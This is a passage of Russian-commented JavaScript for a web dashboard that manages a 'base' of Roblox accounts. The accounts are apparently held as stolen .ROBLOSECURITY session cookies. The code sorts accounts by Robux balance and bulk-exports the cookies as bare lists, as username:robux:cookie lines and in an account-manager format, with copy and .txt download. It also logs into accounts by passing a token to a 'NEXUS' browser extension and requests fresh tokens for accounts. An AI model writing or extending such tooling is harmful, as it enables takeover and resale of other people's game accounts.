  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    restoreBtnText();
    toast('⚠️ Установите расширение NEXUS для авторизации', 'err');
  }, 900);
}

// ── Сортировка ────────────────────────────────────────────────────────────────
document.getElementById('btnSortDate').addEventListener('click', function() {
  sortMode = 'date';
  this.classList.add('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  document.getElementById('btnSortLogin').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortRobux').addEventListener('click', function() {
  sortMode = 'robux';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  document.getElementById('btnSortLogin').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortLogin').addEventListener('click', function() {
  sortMode = 'login';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  renderTokens();
});

// ── Экспорт токенов (Modal) ───────────────────────────────────────────────────
document.getElementById('btnExportModal')?.addEventListener('click', openExportModal);

function openExportModal() {
  const modal = document.getElementById('exportModal');
  if (!modal) return;
  currentExportFormat = 'cookie';
  updateExportText();
  modal.classList.add('open');
}

function closeExportModal() {
  const modal = document.getElementById('exportModal');
  if (modal) modal.classList.remove('open');
}

function changeExportFormat(format) {
  currentExportFormat = format;
  ['btnExportFormatCookie', 'btnExportFormatFull', 'btnExportFormatRam'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.classList.remove('btn-primary');
  });
  if (format === 'cookie') document.getElementById('btnExportFormatCookie')?.classList.add('btn-primary');
  if (format === 'full') document.getElementById('btnExportFormatFull')?.classList.add('btn-primary');
  if (format === 'ram') document.getElementById('btnExportFormatRam')?.classList.add('btn-primary');
  updateExportText();
}

function updateExportText() {
  const textarea = document.getElementById('exportText');
  const countLbl = document.getElementById('exportCountLabel');
  if (!textarea) return;

  const validTokens = allTokens.filter(t => t.security);
  if (countLbl) countLbl.textContent = validTokens.length + ' токенов готово к экспорту';

  let output = '';
  if (currentExportFormat === 'cookie') {
    output = validTokens.map(t => t.security).join('\n');
  } else if (currentExportFormat === 'full') {
    output = validTokens.map(t => `${t.username || 'unknown'}:${t.robux || 0}:${t.security}`).join('\n');
  } else if (currentExportFormat === 'ram') {
    output = validTokens.map(t => `${t.username || 'unknown'}:${t.security}`).join('\n');
  }
  textarea.value = output;
}

function copyExportText() {
  const textarea = document.getElementById('exportText');
  if (!textarea || !textarea.value) return;
  copyText(textarea.value);
  toast('📋 База скопирована в буфер обмена!');
}

function downloadExportText() {
  const textarea = document.getElementById('exportText');
  if (!textarea || !textarea.value) return;
  const blob = new Blob([textarea.value], { type: 'text/plain;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `roblox_accounts_${Date.now()}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
  toast('💾 Файл .txt сохранен');
}

// ── Удаление токена ──────────────────────────────────────────────────────────
async function deleteToken(fileId) {
  if (!confirm('Вы уверены, что хотите удалить этот аккаунт из базы?')) return;
  try {
    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
    if (r.ok) {
      toast('Аккаунт удален');
      selectedTokens.delete(fileId);
      loadTokens();
    } else {
      toast('Ошибка удаления', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Меню действий токена (3 точки) ───────────────────────────────────────────
function toggleTokenMenu(event, fileId) {
  event.stopPropagation();
  const wrap = event.target.closest('.token-menu-wrap');
  if (!wrap) return;
  const card = wrap.closest('.token-card') || wrap.closest('tr');

  const existing = wrap.querySelector('.token-dropdown-menu');
  closeAllMenus();
  if (existing) return;

  if (card) card.classList.add('menu-open');

  const token = allTokens.find(t => t.file === fileId);

  const menu = document.createElement('div');
  menu.className = 'token-dropdown-menu';
  menu.onclick = function(e) { e.stopPropagation(); };

  let html = '';

  // 1. Запросить новый токен
  html += '<button class="token-menu-item" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">📡</span>';
  html += '<span class="menu-label">Запросить токен</span>';
  html += '</button>';

  // 2. Пометки & Заметки (открывает удобный чистый модал без багов)
  html += '<button class="token-menu-item" onclick="openTagModal(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">🏷️</span>';
  html += '<span class="menu-label">Пометки игр & заметка</span>';
  html += '</button>';

  // 3. Открыть профиль Roblox (если есть ID)
  if (token && token.userId) {
    html += '<a href="https://www.roblox.com/users/' + token.userId + '/profile" target="_blank" rel="noopener" class="token-menu-item" onclick="closeAllMenus();" style="text-decoration:none;">';
    html += '<span class="menu-icon">↗️</span>';
    html += '<span class="menu-label">Профиль Roblox</span>';
    html += '</a>';
  }

  html += '<div class="token-menu-divider"></div>';

  // 4. Удалить
  html += '<button class="token-menu-item danger" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">🗑️</span>';
  html += '<span class="menu-label">Удалить из базы</span>';
  html += '</button>';

  menu.innerHTML = html;
  wrap.appendChild(menu);
}

function closeAllMenus() {
  document.querySelectorAll('.token-card.menu-open, tr.menu-open').forEach(c => c.classList.remove('menu-open'));
  document.querySelectorAll('.token-dropdown-menu').forEach(d => d.remove());
}

// Запуск загрузки
loadTokens();
